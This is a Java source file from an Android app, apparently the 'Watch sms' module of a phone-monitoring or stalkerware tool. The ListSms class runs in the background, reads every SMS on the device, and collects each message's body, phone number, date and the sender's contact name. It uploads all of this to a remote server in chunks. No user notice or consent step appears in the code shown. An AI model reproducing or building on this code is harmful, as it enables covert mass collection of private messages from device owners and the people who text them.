package com.inet.android.list;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.ContactsContract.PhoneLookup;

import com.inet.android.request.OnDemandRequest;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

/**
 * Archive Sms. Watch sms
 * 
 * 
 */
public class ListSms extends AsyncTask<Context, Void, Void> {
	ConvertDate date;
	Context mContext;
	private String LOG_TAG = "ListSMS";
	private String sendStr = null;
	private String complete;
	private String iType = "2";;
	private Uri uri;
	private Cursor sms_sent_cursor;
	SharedPreferences sp;
	private TurnSendList sendList;
	private String version;

	public void getSmsLogs() {

		date = new ConvertDate();
		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		version = sp.getString("list_sms", "0");

		// -------------- for---------------------------------------------

		uri = Uri.parse("content://sms");

		sms_sent_cursor = mContext.getContentResolver().query(uri, null, null,
				null, "date desc");
		Logging.doLog(LOG_TAG, "readSMS", "readSMS");

		if (sp.getBoolean("network_available", true) == true) {
			complete = "0";
			// Read the sms data and store it in the list
			if (sms_sent_cursor != null) {
				// формируем JSONobj
				JSONObject archiveSMSJson = new JSONObject();
				if (sms_sent_cursor.moveToFirst()) {

					for (int i = 0; i < sms_sent_cursor.getCount(); i++) {
						int typeSms = sms_sent_cursor.getInt(sms_sent_cursor
								.getColumnIndex("type"));
						String type = "0";
						switch (typeSms) {
						case 1:
							type = "5";
							break;
						case 2:
							type = "6";
							break;
						default:
							type = "7";
							break;
						}
						try {
							archiveSMSJson
									.put("time",
											date.getData(sms_sent_cursor.getLong(sms_sent_cursor
													.getColumnIndexOrThrow("date"))));
							archiveSMSJson.put("type", type);
							archiveSMSJson.put("number", sms_sent_cursor
									.getString(sms_sent_cursor
											.getColumnIndex("address")));
							archiveSMSJson.put("data", sms_sent_cursor
									.getString(sms_sent_cursor
											.getColumnIndex("body")));
							archiveSMSJson
									.put("name",
											getContactName(
													mContext,
													sms_sent_cursor
															.getString(sms_sent_cursor
																	.getColumnIndex("address"))));

							if (sendStr == null)
								sendStr = archiveSMSJson.toString();
							else
								sendStr += "," + archiveSMSJson.toString();

						} catch (JSONException e) {
							// TODO Автоматически созданный блок catch
							e.printStackTrace();
						}
						if (sendStr.length() >= 50000) {

							Logging.doLog(LOG_TAG, "str >= 50000",
									"str >= 50000");
							sendRequest(sendStr, complete);
							sendStr = null;
						}
						Logging.doLog(LOG_TAG, "moveToNext", "moveToNext");

						sms_sent_cursor.moveToNext();

					}
				}
				if (sendStr != null) {
					lastRaw(sendStr);
					sendStr = null;

				} else {
					lastRaw("");
					sendStr = null;
				}
				Logging.doLog(LOG_TAG, "sms_sent_cursor.close()",
						"sms_sent_cursor.close()");
				sms_sent_cursor.close();
			} else {
				Logging.doLog(LOG_TAG, "smsLogCursor == null",
						"smsLogCursor == null");
				lastRaw("");
				sendStr = null;
			}
		} else {
			endList();
			sendStr = null;
		}
	}

	private void endList() {
		sendList = new TurnSendList(mContext);
		sendList.setList(iType, version, "0");

	}

	private void lastRaw(String sendStr) {
		complete = "1";
		Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 ..");
		sendRequest(sendStr, complete);
	}

	private void sendRequest(String str, String complete) {
		if (str != null) {
			OnDemandRequest dr = new OnDemandRequest(mContext, iType, complete,
					version);
			dr.sendRequest(str);
		}
	}

	private String getContactName(Context context, String phoneNumber) {
		ContentResolver cr = mContext.getContentResolver();
		Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI,
				Uri.encode(phoneNumber));
		Cursor cursor = cr.query(uri,
				new String[] { PhoneLookup.DISPLAY_NAME }, null, null, null);
		if (cursor == null) {
			return null;
		}
		String contactName = null;
		if (cursor.moveToFirst()) {
			contactName = cursor.getString(cursor
					.getColumnIndex(PhoneLookup.DISPLAY_NAME));
		}
		if (cursor != null && !cursor.isClosed()) {
			cursor.close();
		}
		return contactName;
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Автоматически созданная заглушка метода
		Logging.doLog(LOG_TAG, "doIn");
		this.mContext = params[0];
		getSmsLogs();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
	}

}
